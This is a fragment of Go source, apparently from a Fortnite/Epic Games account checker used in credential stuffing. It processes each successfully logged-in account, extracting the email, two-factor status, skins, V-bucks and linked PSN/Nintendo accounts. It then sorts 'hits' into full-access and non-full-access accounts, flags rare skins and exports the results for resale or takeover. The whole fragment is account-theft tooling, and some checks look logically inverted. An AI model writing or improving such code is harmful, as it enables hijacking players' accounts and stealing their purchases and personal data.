    processedResults["has_stw"] = hasStw
    if linkedData, ok := results["linked"]; ok {
        linkedText := string(linkedData.([]byte))
        hasPsn = !strings.Contains(linkedText, "\"type\":\"psn\",")
        hasNintendo = !strings.Contains(linkedText, "\"type\":\"nintendo\",")
    }
    processedResults["has_psn"] = hasPsn
    processedResults["has_nintendo"] = hasNintendo
    accountData = processedResults
    epicEmail = accountData["epic_email"].(string)
    tfaEnabled = accountData["tfa_enabled"].(string)
    emailVerified = accountData["email_verified"].(string)
    skinsList = accountData["skins_list"].(string)
    rawSkinsList = accountData["raw_skins_list"].([]string)
    skinCount = accountData["skin_count"].(int)
    lastPlayed = accountData["last_played"].(string)
    totalVbucks = accountData["total_vbucks"].(int)
    hasStw = accountData["has_stw"].(bool)
    hasPsn = accountData["has_psn"].(bool)
    hasNintendo = accountData["has_nintendo"].(bool)
    isFA := strings.ToLower(epicEmail) == strings.ToLower(email)
    _, ogSkinsFound, rareSkinsFound := checkRareSkins(skinsList, rawSkinsList)
    ExportLock.Lock()
    AddToHits(1)
    GetStats().ExportHit(acc, displayName, epicEmail, tfaMethod, lastPlayed, tfaEnabled, skinsList, skinCount, totalVbucks, hasStw, CurrentAccountHeadless, ogSkinsFound, rareSkinsFound)
    if isFA {
        GetStats().ExportFA(acc, displayName, skinCount, totalVbucks, epicEmail, tfaMethod, hasStw, lastPlayed)
    }
    psnStr := "No"
    if hasPsn {
        psnStr = "Yes"
    }
    nintendoStr := "No"
    if hasNintendo {
        nintendoStr = "Yes"
    }
    if isFA {
        AddToFA(1)
    } else {
        AddToNFA(1)
    }
    if tfaEnabled == "true" {
        AddToTwofa(1)
    }
    AddToEpicTwofa(1)
    GetStats().ExportSkins(acc, displayName, skinCount, skinsList, epicEmail, tfaEnabled, psnStr, nintendoStr, emailVerified, IntToString(totalVbucks), tfaMethod, lastPlayed, isFA, hasStw)
    GetStats().ExportStats(acc)
    ExportLock.Unlock()
    CurrentAccountHeadless = false
    return true
}
